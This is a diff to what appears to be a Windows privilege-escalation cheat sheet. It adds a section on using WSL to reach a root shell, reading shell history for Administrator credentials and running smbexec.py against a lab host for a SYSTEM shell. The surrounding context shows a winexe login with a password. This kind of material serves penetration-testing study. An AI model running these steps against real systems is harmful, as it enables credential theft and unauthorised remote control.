@@ -2,6 +2,7 @@
 
 1. [Kernel Exploits](#kernel-exploits)
 2. [Passwords and Port Forwarding](#passwords-and-port-forwarding)
+3. [Windows Subsystem for Linux](#windows-subsystem-for-linux)
 
 ## Kernel Exploits
 
@@ -125,4 +126,38 @@ winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
 
 whoami
 #Administrator
+```
+
+## Windows Subsystem for Linux
+
+```shell
+#on windows shell
+where -R C:\Windows bash.exe
+
+where -R C:\Windows wsl.exe
+#to find bash.exe or wsl.exe
+#for getting into wsl
+
+C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\bash.exe
+#we get linux shell now
+
+whoami
+#root
+
+#we cannot access the Windows files yet
+
+python -c "import pty;pty.spawn('/bin/bash')"
+
+#using linux privesc
+
+ls -la
+#check files
+
+history
+#check history
+#this contains creds for Administrator
+
+#on attacker machine
+smbexec.py Administrator:'passwordfound'@10.10.10.97
+#gives us a semi-shell as System
 ```
